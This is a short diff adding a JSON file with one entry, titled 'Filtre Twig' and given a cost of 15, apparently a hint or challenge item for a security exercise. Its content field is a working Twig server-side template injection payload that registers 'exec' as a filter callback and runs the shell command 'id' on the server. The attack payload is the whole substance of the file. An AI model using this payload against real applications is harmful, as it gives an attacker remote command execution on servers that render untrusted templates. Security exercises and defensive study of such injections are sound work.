@@ -1,0 +1,7 @@
+[
+  {
+    "title": "Filtre Twig",
+    "cost": 15,
+    "content": "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
+  }
+]
